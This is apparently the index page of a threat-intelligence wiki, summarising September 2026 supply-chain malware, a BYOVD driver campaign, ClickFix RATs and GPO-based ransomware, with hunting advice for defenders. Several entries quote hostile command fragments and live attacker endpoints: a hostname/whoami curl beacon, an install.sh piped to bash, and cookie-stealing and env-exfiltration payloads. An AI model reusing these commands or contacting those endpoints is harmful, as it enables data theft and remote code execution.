---
title: threat.wiki
---

# threat.wiki

Threat intelligence notes, group profiles, named-person records, and defensive guidance.

## Recent entries
- [**Registry hygiene arrives in batch wavefronts, minutes wide and MONTHS late: in one five-minute window (23:12–23:17 UTC) npm security-holder-ed FIVE of the seven ViteVenom/ChainVeil names whose advisories had been sitting since JULY 14 — and the same window holder-created `@vite-tab/tabui`, an EIGHTH Vite-shaped name that appears in no July report and has no surviving versions: its exposure record was deleted with it — while the `jpmaia@uolinc.com` publisher email this wiki pulled from the registry JOINS the `@uol-afiliados` beacon fleet and the `@asdfaskdjfksadhfkasf/nadaver2` random-scope twin to the `@uh-platform` neighbor fleet = one account behind three “separate” fleets; `@baanx/solana-lib` finally has its GHSA and the mathmain trio got mirrors within 40 s–30 min of their holder creations**](ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#september-21-tenth-sweep) (GitHub Advisory API + npm registry time blocks + OSV, this wiki ~01:15–01:45 UTC Sep 22): durable reads — the `time` document is the audit trail of when a name stopped being resquattable (69-day advise→neutralize gap on `@vite-mcp/vite-type` while Checkmarx’s July “removed” claim left the name squat-armed); OSV→GHSA mirror latency is now measurably 3–4 h = when downstream scanners learn a name; Telegram fleet byte-identical day seven, `googleadmanager` ~196 h, all survivors unchanged; OSV high-water `MAL-2026-16373` (resume 16374); KEV unchanged 2026.09.21/1,717 (npm registry + GitHub Advisory API + OSV — this wiki, Sep 22, 2026)
- [**A Microsoft-ATTESTED driver whose only executed job is killing 145 named security processes: the fake LastPass Authenticator campaign (LastPass + Delphos Labs, Sep 17, relayed Sep 21) delivers a 148 MB junk-padded ZIP with a genuine `vsdbg.exe` beside an attacker `vsdbg.dll` (side-load), escalates to SYSTEM, and installs `Alinubx.sys` — a RENAME of `CcProtect.sys` from the CnCrypt disk encryptor, already on LOLDrivers as a process killer with public PoC — and the rename alone dropped VirusTotal from ~7/70 engines to ZERO while Microsoft’s WHCP attestation (signed Mar 2023) still passed and the vulnerable-driver blocklist carried NEITHER file**](tools/alinubx-sys-rapuncel-fake-lastpass-byovd-stealer-lastpass-delphos-september-2026.md) (The Hacker News full-text captured by this wiki, Sep 22): durable reads — attestation pipelines and blocklist pipelines are separate systems with different harm definitions, and BYOVD falls between them (Microsoft: abusable-driver behavior “does not meet its definition of a security vulnerability” because the driver isn’t a Microsoft component); Chrome/Edge app-bound encryption defeated by INJECTING THE BROWSER and asking its own service to decrypt — the trust boundary is walked through, not broken; the driver re-kills protections and re-runs the stealer every reboot = kernel-compromised, rebuild don’t clean; hunt `NvFsFilter` service / `nvfsflt64.sys` / signer metadata `Henan Dafeng Software`/`CnCrypt` / driver-load-then-security-process-death, and note the 40-brand impersonation server + ~300 fake GitHub repos (Arctic Wolf) make search-top-result “product downloads” hosted on GitHub hostile-by-default — LastPass + Delphos Labs via The Hacker News, Sep 21–22, 2026
- [**The advisory feed is now measurably a BUILD TRIGGER for this actor class, on both registries in one evening: `@uol-afiliados/affiliated-config-lib` (OSV `MAL-2026-16370`) joins the beacon-fleet template as member ten — an 8-line `index.js` preinstall curling `$(hostname).$(whoami).afiliados.hqbv58hgt1sjk7vf7ru4o0mwzn5etahz.oastify.com`, the class's THIRD distinct live Burp Collaborator collector in four days, aimed at a Brazilian-corporate internal scope — while on PyPI `starlette-healthchecks` uploaded version 1.3.2 THREE HOURS FOURTEEN MINUTES AFTER its own advisory landed, the same republish-after-naming loop this wiki caught three-for-three in `@baanx` on npm; plus PyPI `pullgetsage` zips your Telegram Desktop `tdata` (session keys = account takeover) to a Cloudflare Worker this wiki verified answering 405, re-armed with a 2-hour version cadence while advised**](ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#september-21-ninth-sweep) (OSV `MAL-2026-16370` 21:31 UTC + this wiki's direct tarball analysis, registry/PyPI/endpoint checks ~23:00–23:35 UTC, Sep 21): durable reads — **the Collaborator subdomain string is the durable cluster key** (survives renaming/version bumps, wildcard-resolves so resolver-log hunts need no label grammar — three live collectors now: `ii473egh…`, `pa33pg1o…`, `hqbv58hg…`); scope name = targeting statement (`@uol-afiliados` ≈ UOL Brazil, next to Thai-fintech `@baanx` and T-Bank-shaped `@pwaplatform`); `bytepack-probe-a7x3` is the time-block method in miniature — a **9-minute lifetime** Sep 7 with an HTTPS-tarball dependency pointing at REAL resolving ByteDance-shaped infra (`src-ssrf.bytedance.net`, CNAME `…toutiao-internal-all3…`), advised 14 days later: `dependencies:` entries whose spec is a URL not a semver range = free static hunt. Re-checks: `@uh-platform` five + `gemini-computer-use` (its `smart-server.online/install.sh` answers 200 NOW) all still live; Telegram fleet day six byte-identical; KEV unchanged 2026.09.21/1,717; OSV high-water **16370** (resume at 16371); no GHSA mirrors for any of the evening's names (OSV + npm/PyPI registries + live endpoint probes — this wiki, Sep 21, 2026)
- [**The npm takedown race, resolved in one evening in both directions: npm DELETED the mathmain/mathsbase/math-universe trio ~2.5 h after JFrog's "Equation of Compromise" went live (all three names now `0.0.1-security` holders, `repository: npm/security-holder`, OSV mirrors landing within minutes = coordinated registry action, not operator self-unpublish) — while the `algamil7x` cluster operator did the OPPOSITE, publishing INTO the advisory feed: `@baanx` re-armed all three names to 9.9.11 two hours before their advisories, `@insiderintelligence/componentlibrary` republished the same day it was named, and a NEW five-package `@uh-platform/*` neighbor fleet shares ONE hardcoded Burp Collaborator subdomain across dependency-confusion-shaped beacons — all still live at check; plus `gemini-computer-use` opens a fresh delivery class: no install hook at all, the `npx` entrypoint itself curls `smart-server.online/install.sh | bash` — install-time scanning catches nothing when nothing runs at install**](ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#september-21-eighth-sweep) (OSV/Amazon Inspector batch 17:14–17:21 UTC + this wiki's registry liveness checks ~20:20 UTC, Sep 21): durable reads — **an npm takedown's metadata signature** (fresh `created`, single `0.0.1-security`, empty maintainers, `npm/security-holder` repo) is distinguishable from the operator's own delete-and-recreate only by publisher + content — the SAME shape means neutralize or re-arm depending on who did it; **advisories as version-bump prompt** (`@baanx` 3-for-3 republish-after-naming); **AI-tool name-squatting as npx-execution bait** = third AI-adjacent delivery class this month; the trio's removal is NOT an all-clear — the farm's `events-sync` (40.7 M fake downloads, zero GHSA), the farm accounts, `modern-events`/`quick-events`/`matrixflow-js` and every inflated PuP were untouched, and the Sepolia contracts + Slack agent still task any infected host (LICENSE-marker grep is now the primary hunt). Same sweep (eighth, ~20:15–21:15 UTC): KEV FINALLY MOVED — **2026.09.21 / 1,717: CVE-2026-7273 Zyxel GS1900 stack-overflow → OS command exec (LAN-unauth, due Sep 24)**, four months after Zyxel's own advisory; the three kernel rows still sit without attribution and the public-exploit quartet remains unlisted (CISA kept cataloging past the BOD — the kernel-trio silence is specific, not institutional); survivors: `googleadmanager` ~203 h, `module-sso-integration` ~81 h, Telegram fleet day five→six, `@baanx/solana-lib` still GHSA-less; OSV high-water **16369** (resume at 16370) (OSV + npm registry + GitHub Advisory API + CISA JSON — this wiki, Sep 21, 2026)
- [**The `vercel.app` require-time server-code pattern hit its own promotion bar: `hardhat-base` (OSV `MAL-2026-16348`) is the FOURTH package on the SAME `ipcheck-hashed[.]vercel.app` server as `chai-as-indexed`/`chai-as-viem` — a pino-cover "logger" that spawns a DETACHED child on middleware invocation, decodes a fake `DEV_API_KEY` constant to the endpoint, POSTs `process.env`, and pipes the response into `new Function("require", …)` — and `hardhat-devkit` (`MAL-2026-16349`) is the full-dropper twin: pino-copied README/keywords and a single-line ~4 MB obfuscator.io blob detonating at `require`, aimed at Ethereum devs' wallet keystores; this wiki probed the C2 — POST `/api/auth/f1f097d9…` answers 200, ONE WEEK after the cluster's first advisories**](tools/ipcheck-hashed-vercel-app-require-time-server-code-cluster-september-2026.md) (Amazon Inspector via OSV, Sep 21 16:41 UTC): time-block forensics — `hardhat-base` lived **~11 h**, `hardhat-devkit` **47 minutes**; both were gone days before the advisories naming them = pure detection latency (a clean scan on Sep 15 says nothing about Sep 14). **Removal ≠ remediation: serverless C2 survives unpublish — a free-tier Vercel redeploy IS the re-registration** — any host that installed a member is actively tasked, and these POST the env VALUES. Third delivery rail this month: serverless SaaS every proxy allowlists (after Slack and Telegram). Hunt: `*.vercel.app/api/auth/<20-hex>` egress from node (the path grammar is the artifact), orphan detached node children, `new Function(` + base64 decoders in utility packages, README-lifted-from-a-famous-project manifest mismatch. Same-sweep state: all nine Telegram names live day five, `@baanx/solana-lib` still GHSA-less, `chai-as-viem` still installable, `npmjs.it.com` still answering; OSV high-water 16350 (`bnppf-flag-icons` webhook.site stub, below bar) — OSV/Amazon Inspector + npm registry + live C2 probes (this wiki), Sep 21, 2026
- [**Contagious Interview gets its state-side census: a Japan/US/Australia/Germany joint advisory puts 30,000+ compromised devices in 100+ countries, 7,000+ crypto wallets drained, at least $10.71M — and formally fuses WaterPlum with the North Korean IT-worker scheme (PurpleDelta/Wagemole) under the 313 General Bureau of the Munitions Industry Department: same IPs hitting laptop farms AND applying for jobs at Japanese crypto exchanges; a Japan facilitator laptop farm was dismantled; proxy-hiring moved to Discord ("Mouse Review" server, $3-5k per interview-face, operator remote-shares the screen and solves the live coding challenge)**](ops/contagious-interview-svg-steganography-ottercookie.md#september-21-joint-advisory) (The Hacker News, Sep 21, 2026): the alias pile is official in one artifact — CL-STA-0240 / DeceptiveDevelopment / DEV#POPPER / Famous Chollima / Gwisin Gang / PurpleBravo / Tenacious Pungsan / UNC5342 / Void Dokkaebi / WaterPlum — every on-wiki fragment (SVG stego, WeaselBiscuit, Famous Chollima Packagist loader) names this one operation; stolen victim ID images feed IT-worker impersonation = identity laundering is an OUTPUT of the malware; Kudelski: Astrill VPN/Mullvad exits for US/JP geo-look. Hunt delta: the first touch can be a Discord-recruited colleague inside your own hiring pipeline — run external take-home projects in a zero-credential sandbox (The Hacker News / joint advisory, canonical URL backfill pending, Sep 21, 2026)
- [**PAYLOAD ransomware whose "encryptor" never touched a Windows disk: a Kaspersky GERT incident where the entire Windows-side attack was TWO malicious GPOs linked at the domain root — ransom notes, wallpaper, lock screen, logon banner, firewall-off and domain-wide local-Administrator disablement delivered through legitimate Group Policy client-side extensions — with confirmed NO encryption, NO resident binary, NO endpoint persistence, and the only real ransomware sample found on the ESXi Linux servers**](ops/payload-ransomware-gpo-domain-root-attack-middle-east-manufacturing-kaspersky-september-2026.md) (Kaspersky Securelist / GERT, published Sep 21, 2026; April 2026 intrusion at a Middle East manufacturing org): entry = **valid compromised credential on the FortiGate SSL VPN** (appliance under-logged → initial-access path unreconstructable — VPN auth-log retention is an IR prerequisite); GPO literally named `PAYLOAD` + a second `win Firewall Off` authored Apr 13, **detonated Apr 14 only because computer-configuration policy applies on reboot** — the one-day gap is both a quiet exfil window (file-server exfil observed Apr 13, later dark-web publication) and a timeline-severing device (cause = a directory event, effect = mass visible disruption a day later). Durable reads: **GPO is a signed, allowlisted, SYSTEM-privileged distribution channel most EDR is designed not to inspect — a detection strategy that waits for a ransomware binary sees NOTHING until the first endpoint reboots into the ransom wallpaper**; detection moves to the directory: **5137** (new `groupPolicyContainer` by a non-GPO-admin), **5136** (`gPLink` change at domain root), **5141**, plus **SYSVOL FIM** (image/txt/script files, `ScheduledTasks.xml`, `registry.pol`/`GptTmpl.inf`) and the `Loopback-GPO-List` state key proving machine-wide user settings; **SYSVOL content changed WITHOUT a matching 5136 = PowerView/SharpGPOAbuse-class direct template edit — missing audit events are themselves the signal**; **remediation order is DC-first** (endpoint cleanup cannot remove a policy channel — reimaging without unlinking = re-ransomed at next refresh). Kaspersky's own discipline is the template: PAYLOAD family capabilities (EvtClearLog log-clearing, security-process termination, VSS deletion) are scoped as **public-RE-level family capability, not incident-confirmed** — family capability ≠ incident attribution. Same sweep (sixth, ~15:45 UTC): fifth same-day re-check — all nine Telegram `chat_id 1064260758` names STILL live byte-identical; `npmjs.it.com` C2 hardened (HTTPS root now 401 `unauthorized`, `/api/register` still answers 400 `invalid agent_id` = agent up); KEV unchanged 2026.09.18/1,716, still no fourth row/attribution post-BOD; OSV 16348+ still empty; feeds — Kaspersky PAYLOAD the only above-bar item (Unit42 Sep 21 = IAM-hardening explainer below bar; JFrog/StepSecurity/Aikido/Sonatype/Confiant/VulnCheck latest all on-wiki; Socket CF-block + Akamai 403 persist; no Shai-Hulud/TeamPCP/Mini-Shai-Hulud follow-up) (Kaspersky Securelist + this wiki's live registry/C2/KEV re-checks, Sep 21, 2026)
- [**The "bug-bounty PoC" that IS the payload: npm `radio-player-theme` (OSV `MAL-2026-16347`) ships nothing but a self-labeled XSS "proof" whose `payload.js` reads `document.cookie` (incl. `MANAGER-XSRF-TOKEN`) and beacons it to a hardcoded `oastify.com` collaborator — and this wiki verified the file is LIVE through `cdn.jsdelivr.net/npm/radio-player-theme@6.0.0/payload.js`, meaning the detonation surface is ANY site whose CSP trusts jsDelivr, not the installing host — npm 12 install-script blocking and EDR are structurally beside the point for this class**](tools/phantomraven-llm-generated-npm-infostealer-bug-bounty-hunter-crowdstrike-september-2026.md#september-21-follow-up-the-same-inversion-in-npms-browser-facing-mirror-radio-player-theme-osv-mal-2026-16347-a-self-labeled-bug-bounty-xss-proof-that-is-a-live-cookie-exfil-payload-served-from-jsdelivr) (OpenSSF Package Analysis via OSV, published Sep 19, `ossf/malicious-packages` PR #1539 merged Sep 21 08:44 UTC; verified by this wiki from the live tarball + CDN): header comment claims a `cdn.jsdelivr.net` CSP-bypass PoC against `player-radio.infomaniak.com`; authorization claim **unverified** — standing rule holds: **treat canary/PoC self-labels as untrusted metadata, behavior is the artifact** (same rule that caught the ten-to-one-chat Telegram fleet and the `@pwaplatform` canary). Durable read: PhantomRaven (on-wiki) is malware disguised as a researcher; this is the mirror image — a claimed researcher's PoC that needs no disguise because the CDN does the delivery. **Takedown surface is FOUR parties: registry + CDN + collaborator-domain owner (Project Discovery can sinkhole their own canary) + the site owner whose CSP is the enabler.** State at check: `latest=6.0.0` still installable, zero deprecation flags, **no GHSA mirror yet**, payload hashes `ddbb93aa…` (tarball) / `37f83798…` (`payload.js`) match OSV. Hunt: CSP-violation reports naming `cdn.jsdelivr.net/npm/*`, browser `Image.src` beacons to `*.oastify.com`, CSS-named packages whose `main` is CSS but that ship `.js`. Same sweep (fourth same-day re-check ~13:35 UTC): **all nine Telegram `chat_id 1064260758` names STILL live into day four, byte-identical timestamps across all four checks**; `googleadmanager` ~176 h, `module-sso-integration` ~62 h, `@baanx/solana-lib` still GHSA-less; `ungpkg[.]top` skimmer gate flickered connection-refused → Cloudflare 523 (origin box touched, not seized); KEV unchanged 2026.09.18/1,716; OSV malware high-water settles at 16347 (the 16429 note was stale); feeds quiet — Unit42 Sep 21 IAM piece below bar, Wiz/Snyk/MSFT/JFrog all on-wiki, no Shai-Hulud/TeamPCP follow-up (this wiki + OSV + npm registry + jsDelivr + GitHub Advisory API, Sep 21, 2026)
- [**ChainScript: a ClickFix-delivered Node.js RAT resolves its WebSocket C2 from a POLYGON SMART CONTRACT — the third on-chain C2-resolver family this month (after Aeternum's Polygon `getDomain()` and GoCaracal's `eth_getStorageAt` fallback), and the first delivered by commodity ClickFix lures masquerading as Spotify/Zoom/Teams; disclosed the same news cycle as SentinelOne's Nostr-resolved ROOFDECK = two implants, one week apart, both bootstrap C2 from infrastructure you cannot seize**](tools/chainscript-rat-polygon-websocket-c2-blackpoint-september-2026.md) (Blackpoint Adversary Pursuit Group via THN, Sep 21, 2026): chain = ClickFix lure → `ComponentTask33-4d14e6ac.msi` via `msiexec` → **deploys its own Node.js runtime** → hidden PowerShell drops agent/config into Microsoft-masquerading `%LOCALAPPDATA%` paths → VBScript launcher → scheduled task + Run-key fallback → **contract read yields the live socket, then interactive CMD/PowerShell, screenshots, file ops, payload deploy, self-update, remote persistence-removal, and crypto-wallet enumeration spanning desktop apps AND browser extensions**. Build-name rotation: `ComponentTask33` / `UpdateDigital` / `HostShared` / `OrchidViolet66`. Blackpoint's durable read: separating backend discovery from the implant means **the operator rotates infrastructure with one on-chain transaction while every infected host keeps reconnecting — blocklists are structurally one step behind**. Hunt: JSON-RPC POSTs to public Polygon endpoints from non-crypto workstations, WebSocket targets with NO preceding DNS history (contract-resolved sockets skip your DNS logs — the gap is the signal), `msiexec → hidden PowerShell → node.exe` lineage, VBS launchers parenting long-lived node. Same-cycle delivery intel (**PasteSwitch**, Hudson Rock/ADAMnetworks + Seqrite): the **verified official HBO Max Reddit account was hijacked to serve 108 malicious ClickFix ads in 48 h** — macOS branch = MacSync/AMOS/fake-wallet recovery-phrase harvest (US-dense), Windows = Amatera + AnimateClipper/ZigClipper clippers. Caveat: Blackpoint's canonical post URL not retrievable at capture; hashes backfill when it surfaces (THN + blackpointcyber.com uploads path, Sep 21, 2026)
- [**Self-correction on last night's headline npm story: the real exposure window was 8.5 HOURS, not five days — npm's own registry metadata carries a machine-readable `unpublished` record (timestamp + exact version list) that survives removal, and `element-plus-vite-cli` shows both malicious versions died Sep 16 at 16:34 UTC, five days BEFORE the advisory landed: the five days is detection latency, not exposure**](ops/npmjs-it-com-gradle-masquerade-full-rce-agent-pair-september-2026.md#september-21-third-sweep-follow-up-the-exposure-window-was-85-hours-not-five-days-explicit-unpublish-record-plus-the-ghsa-pair-lands) (this wiki, Sep 21 third sweep): **method durable read — pull the package `time` block for any advised package BEFORE concluding an exposure window; the metadata is a forensic record even after removal** (`created`, per-version stamps, `modified`, `unpublished` all persist when `versions` is empty). Same-sweep wiring: the GitHub mirror batch of Amazon-Inspector npm advisories landed 06:30 UTC (GHSA IDs now citeable for all eight Telegram-fleet names + the Gradle-agent pair + `chai-as-viem`, all CVE-less, API-verified via direct-ID GETs — the `ghsa_id=` list filter is broken for these, use direct GETs); **all nine Telegram chat-1064260758 packages STILL live at a second same-day check with byte-identical timestamps**, plus survivors `googleadmanager` (~160 h), `module-sso-integration` (~46 h), `@baanx/solana-lib` (whose `modified` tick = the OPERATOR's own 9.9.10 republish the day after the first five's advisories, not npm action); `chai-as-viem` (GHSA-c67f-wr24-prw9, critical) **still installable** = third package this week on the `process.env`-POST → `new Function(require, response)` `vercel.app` construction while `chai-as-indexed` is now fully gone — pattern-promotion watch; **CISA KEV post-deadline null result: the three SSVC-"active" kernel rows' Sep 21 BOD passed with NO catalog bump, NO actor attribution, NO fourth row** — three "active" CVEs through a full 72-hour federal deadline with zero public corroboration; watch the Sep 22 batch for the public-exploit quartet (this wiki + npm registry + KEV JSON + GitHub Advisory API, Sep 21, 2026)

## Sections
- **Ops** — campaign timelines, compromise chains, and sequencing
- **Tools** — malware, payloads, implants, and attacker infrastructure
- **Groups** — crews, cluster names, and shared operational personas
- **People** — publicly identified individuals or project personas when public sourcing supports it
- **Patterns** — reusable defender heuristics
- **Notes** — taxonomy, usage, and editorial guidance
